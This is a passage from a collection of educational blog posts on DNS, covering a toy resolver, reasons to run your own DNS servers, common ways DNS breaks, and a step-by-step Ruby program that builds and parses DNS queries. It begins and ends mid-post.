write this program in a way that recurses more, by\nreplacing the loop with more recursion. And then it would recurse 3 or 6 or 7\nor 9 times, depending on the domain. But to me the loop feels easier to read so\nI wrote it with a loop instead. \n\n a bash version of this resolver \n\n I wanted to see if it was possible to write a DNS resolver in 10-15 lines of bash, similarly to  this short “run a container” script \n\n The program I came up with was kind of too long in the end (it’s about 36 lines), but here it is anyway. It uses the exact same algorithm as the Go program. \n\n https://github.com/jvns/tiny-resolver/blob/main/resolver.sh \n\n The bash version is even more janky and uses  grep  in very questionable ways\nbut it did resolve every domain I tried which is cool. \n\n It actually helped me write the Go resolver (which I actually started back in\nNovember but got stuck on) because bash’s limitations forced me to simplify the\ndesign and simplifying it fixed a bug I was running into. \n\n how is this different from a “real” DNS resolver? \n\n Obviously this is only 80 lines so there are a lot of differences between this\nand a “real” DNS resolver. Here are a few: \n\n \n it only handles A records, not other record types \n specifically it doesn’t handle CNAME records (though you can easily add CNAME support with just  another 12 lines of code ) \n it always only returns one A record even if there are more \n it has absolutely no ability to handle errors like “there were no A records” (the Go program just panics) \n the way it handles the glue records is a bit sketchy, probably it should\ncheck that they match the nameservers in the “Authority” section or\nsomething.  It seems to work though. \n DNS resolvers are usually servers, this is a command line program \n it doesn’t validate DNSSEC or whatever \n it doesn’t do caching \n it doesn’t try a different nameserver if one of the domain’s nameservers isn’t working and times out the DNS query \n like we mentioned above, unbound seems to look up the addresses of all the nameservers for a domain \n probably there are other bugs and ways it violates the DNS spec that I don’t know about \n \n\n tiny versions of real programs are fun \n\n As usual I always learn something from writing tiny versions of real programs.\nI’ve written this program before but I think this version is better than the\nfirst version I wrote. \n\n In 2020 I ran a 2-day workshop with my friend Allison called “Domain Name\nSaturday” where all the participants wrote DNS resolvers. Basically the idea\nwas that you implement the algorithm described in this post, as well as the\nbinary parsing pieces that the  miekg/dns  library handles here. At some point\nI want to write up that workshop so that other people could run it, because it\nwas really fun. \n\n One question I still have is – are there domains where the  resolve  function\nwould recurse 3 times or more on? Obviously you could manufacture such a domain\nby making it intentionally have to go through a bunch of hoops, but.. do they\nexist in the real world? \n\n"},
{"url": "https://jvns.ca/blog/2022/01/05/why-might-you-run-your-own-dns-server-/", "title": "Why might you run your own DNS server?", "content": "\n     \n\n One of the things that makes DNS difficult to understand is that it’s\n decentralized . There are thousands (maybe hundreds of thousands? I don’t know!) of authoritative nameservers, and at least\n 10 million resolvers .\nAnd they’re running lots of different software! All these different servers\nrunning software means that there’s a lot of inconsistency in how DNS works,\nwhich can cause all kinds of frustrating problems. \n\n But instead of talking about the problems, I’m interested in figuring out –\nwhy is it a good thing that DNS is decentralized? \n\n why is it good that DNS is decentralized? \n\n One reason is  scalability  – the decentralized design of DNS makes it\neasier to scale and more resilient to failures. I find it really amazing that\nDNS is still scaling well even though it’s almost 40 years old. This is very\nimportant but it’s not what this post is about. \n\n Instead, I want to talk about how the fact that it’s decentralized means that\nyou can have  control  of how your DNS works. You can add more servers to the\ngiant complicated mess of DNS servers! Servers that you control! \n\n Yesterday I  asked on Twitter  why you might\nwant to run your own DNS servers, and I got a lot of great answers that I\nwanted to summarize here. \n\n you can run 2 types of DNS servers \n\n There are 2 main types of DNS servers you can run: \n\n \n if you own a domain, you can run an  authoritative nameserver  for that domain \n if you have a computer (or a company with lots of computers), you can run a  resolver  that’s resolves DNS for those computers \n \n\n DNS isn’t a static database \n\n I’ve seen the “phone book” metaphor for DNS a lot, where domain names are like\nnames and IP addresses are like phone numbers. \n\n This is an okay mental model to start with. But the “phone book” mental model\nmight make you think that if you make a DNS query for  google.com , you’ll\nalways get the same result. And that’s not true at all! \n\n Which record you get in reply to a DNS query can depend on: \n\n \n where you are in the world (maybe you’ll get an IP address of a server that’s physically closer to you!) \n if you’re on a corporate network (where you might be able to resolve internal domain names) \n whether the domain name is considered “bad” by your DNS resolver (it might be blocked!) \n the previous DNS query (maybe the DNS resolver is doing DNS-based load balancing to give you a different IP address every time) \n whether you’re using an airport wifi captive portal (airport wifi will resolve DNS records differently before you log in, it’ll send you a special IP to redirect you) \n literally anything \n \n\n A lot of the reasons you might want to control your own server are related to\nthe fact that DNS isn’t a static database – there are a lot of choices you\nmight want to make about how DNS queries are handled (either for your domain or for your organization). \n\n reasons to run an authoritative nameserver \n\n These reasons aren’t in any particular order. \n\n For some of these you don’t necessarily have to run your own authoritative\nnameserver, you can just choose an authoritative nameserver service that has\nthe features you want. \n\n To be clear: there are lots of reasons  not  to run your own authoritative\nnameserver – I don’t run my own, and I’m not trying to convince you that you\nshould. It takes time to maintain, your service might not be as reliable, etc. \n\n reason: security \n\n this tweet phrased it well : \n\n \n [There’s a] risk of an attacker gaining DNS change access through your vendor’s customer\nsupport people, who only want to be helpful. Or getting locked out from your\nDNS (perhaps because of the lack of that). In-house may be easier to audit and\nverify the contents. \n \n\n reason: you like running bind/nsd \n\n One reason several people mentioned was “I’m used to writing zone files and\nrunning  bind  or  nsd , it’s easier for me to just do that”. \n\n If you like the interface of bind/nsd but don’t want to operate your own\nserver, a couple of people mentioned that you can also get the advantages of\nbind by running a “hidden primary” server which stores the records, but serve\nall of the actual DNS queries from a “secondary” server. Here are some pages\nI found about configuring secondary DNS from from  NS1  and  cloudflare  and  Dyn  as an example. \n\n I don’t really know what the best authoritative DNS server to run is. I think\nI’ve only used nsd at work. \n\n reason: you can use new record types \n\n Some newer DNS record types aren’t supported by all DNS services, but if you\nrun your own you can support any record types you want. \n\n reason: user interface \n\n You might not like the user interface (or API, or lack of API) of the DNS\nservice you’re using. This is pretty related to the “you like running BIND”\nreason – maybe you like the zone file interface! \n\n reason: you can fix problems yourself \n\n There are some obvious pros and cons to being able to fix problems yourself\nwhen they arise (pro: you can fix the problem, con: you have to fix the\nproblem). \n\n reason: do something weird and custom \n\n You can write a DNS server that does anything you want, it doesn’t have to just return a static set of records. \n\n A few examples: \n\n \n Replit has a blog post about  why they wrote their own authoritative DNS server to handle routing \n nip.io  maps 10.0.0.1.nip.io to 10.0.0.1 \n I wrote a custom DNS server for  mess with dns \n \n\n reason: to save money \n\n Authoritative nameservers seem to generally charge per million DNS queries. As\nan example, at a quick glance it looks like Route 53 charges about $0.50 per\nmillion queries and  NS1  charges about $8 per million queries. \n\n I don’t have the best sense for how many queries a large website’s\nauthoritative DNS server can expect to actually need to resolve (what kinds of\nsites get 1 billion DNS queries to their authoritative DNS server? Probably a\nlot, but I don’t have experience with that.). But a few people in the replies\nmentioned cost as a reason. \n\n reason: you can change your registrar \n\n If you use a separate authoritative nameserver for your domain instead of your\nregistrar’s nameserver, then when you move to a different registrar all you have\nto do to get your DNS back up is to set your authoritative DNS server to the\nright value. You don’t need to migrate all your DNS records, which is a huge\npain! \n\n You don’t need to run your own nameserver to do this. \n\n reason: geo DNS \n\n You might want to return different IP addresses for your domain depending on\nwhere the client is, to give them a server that’s close to them. \n\n This is a service lots of authoritative nameserver services offer, you don’t\nneed to write your own to do this. \n\n reason: avoid denial of service attacks targeted at someone else \n\n Many authoritative DNS servers are shared. This means that if someone attacks\nthe DNS server for  google.com  or something and you happen to be using the\nsame authoritative DNS server, you could be affected even though the attack\nwasn’t aimed at you. For example, this  DDoS attack on Dyn  in 2016. \n\n reason: keep all of your configuration in one place \n\n One person mentioned that they like to keep all of their configuration (DNS\nrecords, let’s encrypt, nginx, etc) in the same place on one server. \n\n wild reason: use DNS as a VPN \n\n Apparently  iodine  is an authoritative DNS\nserver that lets you tunnel your traffic over DNS, if you’re on a network that\nonly allows you to contact the outside world as a VPN. \n\n reasons to run a resolver \n\n reason: privacy \n\n If someone can see all your DNS lookups, they have a complete list of all the\ndomains you (or everyone from your organization) is visiting! You might prefer\nto keep that private. \n\n reason: block malicious sites \n\n If you run your own resolver, you can refuse to resolve DNS queries (by just\nnot returning any results) for domains that you consider “bad”. \n\n A few examples of resolvers that you can run yourself (or just use): \n\n \n Pi-Hole  blocks advertisers \n Quad9  blocks domains that do malware/phishing/spyware. Cloudflare seems to have a  similar service \n I imagine there’s also corporate security software that blocks DNS queries for domains that host malware \n DNS isn’t a static database. It’s very dynamic, and answers often depend in\nreal time on the IP address a query came from, current load on content\nservers etc. That’s hard to do in real time unless you delegate serving those\nrecords to the entity making those decisions. \n DNS delegating control makes access control very simple. Everything under a\nzone cut is controlled by the person who controls the delegated server, so\nresponsibility for a hostname is implicit in the DNS delegation. \n \n\n reason: get dynamic proxying in nginx \n\n Here’s a cool story from  this tweet : \n\n \n I wrote a DNS server into an app and then set it as nginx’s resolver so that I could get dynamic backend proxying without needing nginx to run lua. Nginx sends DNS query to app, app queries redis and responds accordingly. It worked pretty great for what I was doing. \n \n\n reason: avoid malicious resolvers \n\n Some ISPs run DNS resolvers that do bad things like nonexistent domains to an\nIP they control that shows you ads or a weird search page that they control. \n\n Using either a resolver you control or a different resolver that you trust\ncan help you avoid that. \n\n reason: resolve internal domains \n\n You might have an internal network with domains (like\n blah.corp.yourcompany.com ) that aren’t on the public internet. Running your\nown resolver for machines in the internal network makes it possible to access\nthose domains. \n\n You can do the same thing on a home network, either to access local-only\nservices or to just get local addresses for services that are on the public\ninternet. \n\n reason: avoid your DNS queries being MITM’d \n\n One person  said : \n\n \n I run a resolver on my LAN router that uses DNS over HTTPS for its upstream, so\nIoT and other devices that don’t support DoH or DoT don’t spray plaintext DNS\noutside \n \n\n that’s all for now \n\n It feels important to me to explore the “why” of DNS, because it’s such a\ncomplicated messy system and I think most people find it hard to get motivated\nto learn about complex topics if they don’t understand why all this complexity\nis useful. \n\n \nThanks to Marie and Kamal for discussing this post, and to everyone on Twitter\nwho provided reasons\n \n\n"},
{"url": "https://jvns.ca/blog/2022/01/15/some-ways-dns-can-break/", "title": "Some ways DNS can break", "content": "\n     \n\n When I first learned about it, DNS didn’t seem like it should be THAT\ncomplicated. Like, there are DNS records, they’re stored on a server, what’s\nthe big deal? \n\n But with DNS, reading about how it works in a textbook doesn’t prepare you for\nthe sheer volume of different ways DNS can break your system in practice. It’s\nnot just caching problems! \n\n So I  asked people on Twitter  for\nexample of DNS problems they’ve run into, especially DNS problems that  didn’t\ninitially appear to be DNS problems . (the popular “it’s always DNS” meme) \n\n I’m not going to discuss how to solve or avoid any of these problems in this\npost, but I’ve linked to webpages discussing the problem where I could find\nthem. \n\n problem: slow network requests \n\n Your network requests are a little bit slower than expected, and it’s actually\nbecause your DNS resolver is slow for some reason. This might be because the\nresolver is under a lot of load, or it has a memory leak, or something else. \n\n I’ve run into this before with my router’s DNS forwarder – all of my DNS\nrequests were slow, and I restarted my router and that fixed the problem. \n\n problem: DNS timeouts \n\n A couple of people mentioned network requests that were taking 2+ seconds or 30\nseconds because of DNS queries that were timing out. This is sort of the same\nas “slow requests”, but it’s worse because queries can take several seconds to\ntime out. \n\n Sophie Haskins has a great blog post  Misadventures with Kube DNS  about DNS\ntimeouts with Kubernetes. \n\n problem: ndots \n\n A few people mentioned a specific issue where Kubernetes sets  ndots:5  in its  /etc/resolv.conf \n\n Here’s an example /etc/resolv.conf from  Kubernetes pods /etc/resolv.conf ndots:5 option and why it may negatively affect your application performances . \n\n nameserver 100.64.0.10\nsearch namespace.svc.cluster.local svc.cluster.local cluster.local eu-west-1.compute.internal\noptions ndots:5\n \n\n My understanding is that if this is your  /etc/resolv.conf  and you look up\n google.com , your application will call the C  getaddrinfo  function, and\n getaddrinfo  will: \n\n \n look up  google.com.namespace.svc.cluster.local. \n look up  google.com.svc.cluster.local. \n look up  google.com.cluster.local. \n look up  google.com.eu-west-1.compute.internal. \n look up  google.com. \n \n\n Basically it checks if  google.com  is actually a subdomain of everything on the  search  line. \n\n So every time you make a DNS query, you need to wait for 4 DNS queries to fail\nbefore you can get to the actual real DNS query that succeeds. \n\n problem: it’s hard to tell what DNS resolver(s) your system is using \n\n This isn’t a bug by itself, but when you run into a problem with DNS, often\nit’s related in some way to your DNS resolver. I don’t know of any foolproof\nway to tell what DNS resolver is being used. \n\n A few things I know: \n\n \n on Linux, I think that most things use /etc/resolv.conf to choose a DNS\nresolver. There are definitely exceptions though, for example your browser\nmight ignore /etc/resolv.conf and use a different DNS-over-HTTPS service\ninstead. \n if you’re using UDP DNS, you can use  sudo tcpdump port 53   to see where DNS\nrequests are being sent. This doesn’t work if you’re using DNS over HTTPS or\nDNS over TLS though. \n \n\n I also vaguely remember it being even more confusing on MacOS than on Linux,\nthough I don’t know why. \n\n problem: DNS servers that return NXDOMAIN instead of NOERROR \n\n Here’s a problem that I ran into once, where nginx couldn’t resolve a domain. \n\n \n I set up nginx to use a specific DNS server to resolve DNS queries \n when visiting the domain, nginx made 2 queries, one for an  A  record, and one for an  AAAA  record \n the DNS server returned a  NXDOMAIN  reply for the  A  query \n nginx decided “ok, that domain doesn’t exist”, and gave up \n the DNS server returned a successful reply for the  AAAA  query \n nginx ignored the  AAAA  record because it had already given up \n \n\n The problem was that the DNS server should have returned  NOERROR  – that\ndomain  did  exist, it was just that there weren’t any  A  records for it. I\nreported the bug, they fixed it, and that fixed the problem. \n\n I’ve implemented this bug myself too, so I understand why it happens – it’s\neasy to think “there aren’t any records for this query, I should return an\n NXDOMAIN  error”. \n\n problem: negative DNS caching \n\n If you visit a domain before creating a DNS record for it, the  absence  of\nthe record will be cached. This is very surprising the first time your run into\nit – I only learned about this last year! \n\n The TTL for cache entry is the TTL of the domain’s SOA record – for example\nfor  jvns.ca , it’s an hour. \n\n problem: nginx caching DNS records forever \n\n If you put this in your nginx config: \n\n location / {\n    proxy_pass https://some.domain.com;\n}\n \n\n then nginx will resolve  some.domain.com  once on startup and never again. This\nis especially dangerous if the IP address for  some.domain.com   changes\ninfrequently, because it might keep happily working for months and then\nsuddenly break at 2am one day. \n\n There are pretty well-known ways to fix this and this post isn’t about nginx so\nI won’t get into it, but it’s surprising the first time you run into it. \n\n Here’s a  blog post  with a story of how this happened to someone with an AWS load balancer. \n\n problem: Java caching DNS records forever \n\n Same thing, but for Java:  Apparently \ndepending on how you configure Java, “the JVM default TTL [might be] set so\nthat it will never refresh DNS entries until the JVM is restarted.” \n\n I haven’t run into this myself but I asked a friend about it who writes more\nJava than me and they told me that it’s happened to them. \n\n Of course, literally any software could have this problem of caching DNS\nrecords forever, but the main cases I’ve heard of in practice are nginx and\nJava. \n\n problem: that entry in /etc/hosts you forgot about \n\n Another variant on caching issues: entries in  /etc/hosts  that override your\nusual DNS settings! \n\n This is extra confusing because  dig  ignores  /etc/hosts , so everything SEEMS\nlike it should be fine (” dig whatever.com  is working!“). \n\n problem: your email isn’t being sent / is going to spam \n\n The way email is sent and validated is through DNS (MX records, SPF records,\nDKIM records), so a lot of email problems are DNS problems. \n\n problem: internationalized domain names don’t work \n\n You can register domain names with non-ASCII characters or emoji like  https://💩.la . \n\n The way this works with DNS is that  💩.la  gets translated into  xn--ls8h.la  with an encoding called “punycode”. \n\n But even though there’s a clear standard for how they should work with DNS, a lot of software doesn’t handle internationalized domain names well!\nThere’s a fun story about this in Julian Squires’ great talk  The emoji that Killed Chrome!! . \n\n problem: TCP DNS is blocked by a firewall \n\n A couple of people mentioned that some firewalls allow UDP port 53 but not TCP\nport 53. But large DNS queries need to use TCP port 53, so this can cause weird\nintermittent problems that are hard to debug. \n\n problem: musl doesn’t support TCP DNS \n\n A lot of applications use libc’s  getaddrinfo  to make DNS queries. musl is an\nalternative to  glibc  that’s used in Alpine Docker container which doesn’t\nsupport TCP DNS. This can cause problems if you make DNS queries where the\nresponse would be too big to fit inside a regular DNS UDP packet (512 bytes). \n\n I’m still a bit fuzzy on this so I might have it wrong, but my understanding of how this can break is: \n\n \n musl’s getaddrinfo makes a DNS query \n the DNS server notices that the response is too big to fit in a single DNS response packet \n the DNS server returns an  empty  truncated response, expecting that the client will retry by making a TCP DNS query \n musl  does not support TCP so it does not retry \n \n\n A blog post about this:  DNS resolution issue in Alpine Linux \n\n problem: round robin DNS doesn’t work with  getaddrinfo \n\n One way you could approach load balancing is to use “round robin DNS”. The idea\nis that every time you make a DNS query, you get a different IP address.\nApparently this works if you use  gethostbyname  to make DNS queries, but it\ndoes not work if you use  getaddrinfo  because  getaddrinfo  sorts the IP\nresponses it receives. \n\n So you could run into an upsetting problem if you switch from  gethostbyname  to  getaddrinfo  behind the scenes without realising that this will break your DNS load balancing. \n\n This is especially insidious because you might not realize that you’re\nswitching to  gethostbyname  to  getaddrinfo  at all – if you’re not writing a\nC program, those functions calls are hidden inside some library. So it could be\npart of a seemingly innocuous upgrade. \n\n Here are a couple of pages discussing this: \n\n \n getaddrinfo breaks round robin DNS \n getaddrinfo with round robin DNS and happy eyeballs \n \n\n problem: a race condition when starting a service \n\n A problem someone  mentioned \nwith Kubernetes DNS: they had 2 containers which started simultaneously and\nimmediately tried to resolve each other. But the DNS lookup failed because the\nKubernetes DNS change hadn’t happened yet, and then the failure was cached so\nit kept failing. \n\n that’s all! \n\n I’ve definitely missed some important DNS problems here, so I’d love to hear\nwhat I’ve missed. I’d also love links to blog posts that write up examples of\nthese problems – I think it’s really useful to see how the problem\nspecifically manifests in practice and how people debugged it. \n\n"},
{"url": "https://jvns.ca/blog/2022/11/06/making-a-dns-query-in-ruby-from-scratch/", "title": "Making a DNS query in Ruby from scratch", "content": "\n     \n\n Hello! A while back I wrote a post about  how to write a toy DNS resolver in Go . \n\n In that post I left out “how to generate and parse DNS queries” because I\nthought it was boring, but a few people pointed out that they did not know how\nto parse and generate DNS queries and they were interested in how to do it. \n\n This made me curious – how much work  is  it do the DNS parsing? It turns out\nwe can do it in a pretty nice 120-line Ruby program, which is not that bad. \n\n So here’s a quick post on how to generate DNS queries and parse DNS responses!\nWe’re going to do it in Ruby because I’m giving a talk at a Ruby conference\nsoon, and this blog post is partly prep for that talk :). I’ve tried to keep it\nreadable for folks who don’t know Ruby though, I’ve only used pretty basic Ruby\ncode. \n\n At the end we’re going to have a very simple toy Ruby version of  dig  that can\nlook up domain names like this: \n\n $ ruby dig.rb example.com\nexample.com\t   20314    A    93.184.216.34\n \n\n The whole thing is about 120 lines of code, so it’s not  that  much.  (The\nfinal program is\n dig.rb  if you want to skip the explanations and just read some code.)\nWe won’t\nimplement the “how a DNS resolver works” from the previous post because, well,\nwe already did that. Let’s get into it! \n\n Along the way I’m going to try to explain how you could figure out some of this\nstuff yourself if you were trying to figure out how DNS queries are formatted from scratch. Mostly that’s “poke around in Wireshark” and “read RFC 1035, the DNS RFC”. \n\n step 1: open a UDP socket \n\n We need to actually  send  our queries, so to do that we need to open a UDP\nsocket. We’ll send our queries to  8.8.8.8 , Google’s DNS server. \n\n Here’s the code to set up a UDP connection to  8.8.8.8 , port 53 (the DNS port). \n\n require 'socket'\nsock = UDPSocket.new\n\nsock.bind('0.0.0.0', 12345)\nsock.connect('8.8.8.8', 53)\n \n\n a quick note on UDP \n\n I’m not going to say too much about UDP here, but I will say that the basic\nunit of computer networking is the “packet” (a packet is a string of bytes),\nand in this program we’re going to do the simplest possible thing you can do\nwith a computer network – send 1 packet and receive 1 packet in response. \n\n So UDP is a way to send packets in the simplest possible way. \n\n It’s the most common way to send DNS queries, though you can also use TCP or\nDNS-over-HTTPS instead. \n\n step 2: copy a DNS query from Wireshark \n\n Next: let’s say we have no idea how DNS works but we want to send a working\nquery as fast as possible. The easiest way to get a DNS query to play with and\nmake sure our UDP connection is working is to just copy one that already works! \n\n So that’s what we’re going to do, using Wireshark (an incredible packet analysis tool) \n\n The steps I used to this are roughly: \n\n \n Open Wireshark and click ‘capture’ \n Enter  udp.port == 53  as a filter (in the search bar) \n Run  ping example.com  in my terminal (to generate a DNS query) \n Click on the DNS query (“Standard query A example.com”) \n Right click on “Domain Name System (query”) in the bottom left pane \n Click ‘Copy’ -> ‘as a hex stream’ \n Now I have “b96201000001000000000000076578616d706c6503636f6d0000010001” on my clipboard, to use in my Ruby program. Hooray! \n \n\n step 3: decode the hex stream and send the DNS query \n\n Now we can send our DNS query to  8.8.8.8 ! Here’s what that looks like: we just need to add 5 lines of code \n\n hex_string = \"b96201000001000000000000076578616d706c6503636f6d0000010001\"\nbytes = [hex_string].pack('H*')\nsock.send(bytes, 0)\n\n# get the reply\nreply, _ = sock.recvfrom(1024)\nputs reply.unpack('H*')\n \n\n [hex_string].pack('H*')  is translating our hex string into a byte string. At\nthis point we don’t really know what this data  means  but we’ll get there in a\nsecond. \n\n We can also take this opportunity to make sure our program is working and is sending valid data, using  tcpdump . How I did that: \n\n \n Run  sudo tcpdump -ni any port 53 and host 8.8.8.8  in a terminal tab \n In a different terminal tab, run  this Ruby program  ( ruby dns-1.rb ) \n \n\n Here’s what the output looks like: \n\n $ sudo tcpdump -ni any port 53 and host 8.8.8.8\n08:50:28.287440 IP 192.168.1.174.12345 > 8.8.8.8.53: 47458+ A? example.com. (29)\n08:50:28.312043 IP 8.8.8.8.53 > 192.168.1.174.12345: 47458 1/0/0 A 93.184.216.34 (45)\n \n\n This is really good - we can see the DNS request (“what’s the IP for\n example.com ”) and the response (“it’s 93.184.216.34”). So everything is\nworking. Now we just need to, you know, figure out how to generate and decode this data ourselves. \n\n step 4: learn a little about how DNS queries are formatted \n\n Now that we have a DNS query for  example.com , let’s learn about what it means. \n\n Here’s our query, formatted as hex. \n\n b96201000001000000000000076578616d706c6503636f6d0000010001\n \n\n If you poke around in Wireshark, you’ll see that this query has 2 parts: \n\n \n The  header  ( b96201000001000000000000 ) \n The  question  ( 076578616d706c6503636f6d0000010001 ) \n \n\n step 5: make the header \n\n Our goal in this step is to generate the byte string\n b96201000001000000000000 , but with a Ruby function instead of hardcoding it. \n\n So: the header is 12 bytes. What do those 12 bytes mean? If you look at\nWireshark (or read  RFC 1035 ), you’ll see\nthat it’s 6 2-byte numbers concatenated together. \n\n The 6 numbers correspond to the query ID, the flags, and then the number of\nquestions, answer records, authoritative records, and additional records in the\npacket. \n\n We don’t need to worry about what all those things are yet though – we just need\nto put in 6 numbers. \n\n And luckily we know exactly which 6 numbers to put because our goal is to\nliterally generate the string  b96201000001000000000000 . \n\n So here’s a function to make the header. (note: there’s no  return  because you don’t need to write  return  in Ruby if it’s the last line of the function) \n\n def make_question_header(query_id)\n  # id, flags, num questions, num answers, num auth, num additional\n  [query_id, 0x0100, 0x0001, 0x0000, 0x0000, 0x0000].pack('nnnnnn')\nend\n \n\n This is very short because we’ve hardcoded everything except the query ID. \n\n what’s  nnnnnn ? \n\n You might be wondering what  nnnnnn  is in  .pack('nnnnnn') . That’s a format\nstring telling  .pack()  how to convert that array of 6 numbers into a byte\nstring. \n\n The documentation for  .pack  is here , and it says that  n  means\n“represent it as “16-bit unsigned, network (big-endian) byte order”. \n\n 16 bits is the same as 2 bytes, and we need to use network byte order because\nthis is computer networking. I’m not going to explain byte order right now\n(though I do have a  comic attempting to explain\nit ) \n\n test the header code \n\n Let’s quickly test that our  make_question_header  function works. \n\n puts make_question_header(0xb962) == [\"b96201000001000000000000\"].pack(\"H*\")\n \n\n This prints out “true”, so we win and we can move on. \n\n step 5: encode the domain name \n\n Next we need to generate the  question  (“what’s the IP for  example.com ?“). This has 3 parts: \n\n \n the  domain name  (for example “example.com”) \n the  query type  (for example “A” is for “IPv4  A ddress” \n the  query class  (which is always the same, 1 is for  IN  is for  IN ternet) \n \n\n The hardest part of this is the domain name so let’s write a function to do that. \n\n example.com  is encoded in a DNS query, in hex, as  076578616d706c6503636f6d00 . What does that mean? \n\n Well, if we translate the bytes into ASCII, it looks like this: \n\n 076578616d706c6503636f6d00\n 7 e x a m p l e 3 c o m 0\n \n\n So each segment (like  example ) has its length (like 7) in front of it. \n\n Here’s the Ruby code to translate  example.com  into  7 e x a m p l e 3 c o m 0 : \n\n def encode_domain_name(domain)\n  domain\n    .split(\".\")\n    .map { |x| x.length.chr + x }\n    .join + \"\\0\"\nend\n \n\n Other than that, to finish generating the question section we just need to\nappend the type and class onto the end of the domain name. \n\n step 6: write  make_dns_query \n\n Here’s the final function to make a DNS query: \n\n def make_dns_query(domain, type)\n  query_id = rand(65535)\n  header = make_question_header(query_id)\n  question =  encode_domain_name(domain) + [type, 1].pack('nn')\n  header + question\nend\n \n\n Here’s all the code we’ve written before in  dns-2.rb  –\nit’s still only 29 lines. \n\n now for the parsing \n\n Now that we’ve managed to  generate  a DNS query, we get into the hard part:\nthe parsing. Again, we’ll split this into a bunch of different \n\n \n parse a DNS header \n parse a DNS name \n parse a DNS record \n \n\n The hardest part of this (maybe surprisingly) is going to be “parse a DNS\nname”. \n\n step 7: parse the DNS header \n\n Let’s start with the easiest part: the DNS header. We already talked about how\nit’s 6 numbers concatenated together. \n\n So all we need to do is \n\n \n read the first 12 bytes \n convert that into an array of 6 numbers \n put those numbers in a class for convenience \n \n\n Here’s the Ruby code to do that. \n\n class DNSHeader\n  attr_reader :id, :flags, :num_questions, :num_answers, :num_auth, :num_additional\n  def initialize(buf)\n    hdr = buf.read(12)\n    @id, @flags, @num_questions, @num_answers, @num_auth, @num_additional = hdr.unpack('nnnnnn')\n  end\nend\n \n\n \nQuick Ruby note:  attr_reader  is a Ruby thing that means “make these instance\nvariables accessible as methods”. So you can call  header.flags  to look at the\n @flags  variable.\n \n\n We can call this with  DNSHeader(buf) . Not so bad. \n\n Let’s move on to the hardest part: parsing a domain name. \n\n step 8: parse a domain name \n\n First, let’s write a partial version. \n\n def read_domain_name_wrong(buf)\n  domain = []\n  loop do\n    len = buf.read(1).unpack('C')[0]\n    break if len == 0\n    domain << buf.read(len)\n  end\n  domain.join('.')\nend\n \n\n This repeatedly reads 1 byte and then reads that length into a string until the\nlength is 0. \n\n This works great, for the first time we see a domain name ( example.com ) in our DNS response. \n\n trouble with domain names: compression! \n\n But the second time  example.com  appears, we run into trouble – in Wireshark,\nit says that the domain is represented cryptically as just the 2 bytes  c00c . \n\n This is something called  DNS compression  and if we want to parse any DNS\nresponses we’re going to have to implement it. \n\n This is luckily not  that  hard. All  c00c  is saying is: \n\n \n The first 2 bits ( 0b11..... ) mean “DNS compression ahead!” \n The remaining 14 bits are an integer. In this case that integer is  12 \n( 0x0c ), so that means “go back to the 12th byte in the packet and use the\ndomain name you find there” \n \n\n If you want to read more about DNS compression, I found the  explanation in the DNS RFC  relatively readable. \n\n step 9: implement DNS compression \n\n So we need a more complicated version of our  read_domain_name  function \n\n Here it is. \n\n   domain = []\n  loop do\n    len = buf.read(1).unpack('C')[0]\n    break if len == 0\n    if len & 0b11000000 == 0b11000000\n      # weird case: DNS compression!\n      second_byte = buf.read(1).unpack('C')[0]\n      offset = ((len & 0x3f) << 8) + second_byte\n      old_pos = buf.pos\n      buf.pos = offset\n      domain << read_domain_name(buf)\n      buf.pos = old_pos\n      break\n    else\n      # normal case\n      domain << buf.read(len)\n    end\n  end\n  domain.join('.')\n \n\n Basically what’s happening is: \n\n \n if the first 2 bits are  0b11 , we need to do DNS compression. Then:\n\n \n read the second byte and do a little bit arithmetic to convert that into the offset \n save the current position in the buffer \n read the domain name at the offset we calculated \n restore our position in the buffer \n \n \n\n This is kind of messy but it’s the most complicated part of parsing the DNS response, so we’re almost done! \n\n a DNS compression exploit \n\n Someone pointed out that a malicious actor could exploit this code by sending a\nDNS response with a DNS compression entry that points to itself, so that\n read_domain_name  would end up in an infinite loop. I won’t update it (the\ncode is already complicated enough!) but a real DNS parser would be\nsmarter and deal with that. For example  here’s the code that avoids infinite loops in miekg/dns \n\n There are also probably other edge cases that would be problematic if this were\na real DNS parser. \n\n step 10: parse a DNS query \n\n You might think “why do we need to parse a DNS query? This is the response!”.\nBut every DNS response has the original query in it, so we need to parse it. \n\n Here’s the code for parsing the DNS query. \n\n class DNSQuery\n  attr_reader :domain, :type, :cls\n  def initialize(buf)\n    @domain = read_domain_name(buf)\n    @type, @cls = buf.read(4).unpack('nn')\n  end\nend\n \n\n There’s not very much to it: the type and class are 2 bytes each. \n\n step 11: parse a DNS record \n\n This is the exciting part – the DNS record is where our query data lives! The\n“rdata field” (“record data”) is where the IP address we’re going to get in\nresponse to our DNS query lives. \n\n Here’s the code: \n\n class DNSRecord \n  attr_reader :name, :type, :class, :ttl, :rdlength, :rdata\n  def initialize(buf)\n    @name = read_domain_name(buf)\n    @type, @class, @ttl, @rdlength = buf.read(10).unpack('nnNn')\n    @rdata = buf.read(@rdlength)\n  end\n \n\n We also need to do a little work to make the  rdata  field human readable. The\nmeaning of the record data depends on the record type  – for example for an\n“A” record it’s a 4-byte IP address, for but a “CNAME” record it’s a domain\nname. \n\n So here’s some code to make the request data human readable: \n\n   def read_rdata(buf, length)\n    @type_name = TYPES[@type] || @type\n    if @type_name == \"CNAME\" or @type_name == \"NS\"\n      read_domain_name(buf)\n    elsif @type_name == \"A\"\n      buf.read(length).unpack('C*').join('.')\n    else\n      buf.read(length)\n    end\n  end\n \n\n This function uses this  TYPES  hash to map the record type to a human-readable name: \n\n TYPES = {\n  1 => \"A\",\n  2 => \"NS\",\n  5 => \"CNAME\",\n  # there are a lot more but we don't need them for this example\n}\n \n\n The most interesting part of  read_rdata  is probably the line  buf.read(length).unpack('C*').join('.')  – it’s saying “hey, an IP address is 4 bytes,\nso convert it into an array of 4 numbers and then join those with “.“s”. \n\n step 12: finish parsing the DNS response \n\n Now we’re ready to parse the DNS response! \n\n Here’s some code to do that: \n\n class DNSResponse\n  attr_reader :header, :queries, :answers, :authorities, :additionals\n  def initialize(bytes)\n    buf = StringIO.new(bytes)\n    @header = DNSHeader.new(buf)\n    @queries = (1..@header.num_questions).map { DNSQuery.new(buf) }\n    @answers = (1..@header.num_answers).map { DNSRecord.new(buf) }\n    @authorities = (1..@header.num_auth).map { DNSRecord.new(buf) }\n    @additionals = (1..@header.num_additional).map { DNSRecord.new(buf) }\n  end\nend\n \n\n This mostly just calls the other functions we’ve written to parse the DNS response. \n\n It uses this cute  (1..@header.num_answers).map  construction to create an\narray of 2 DNS records if  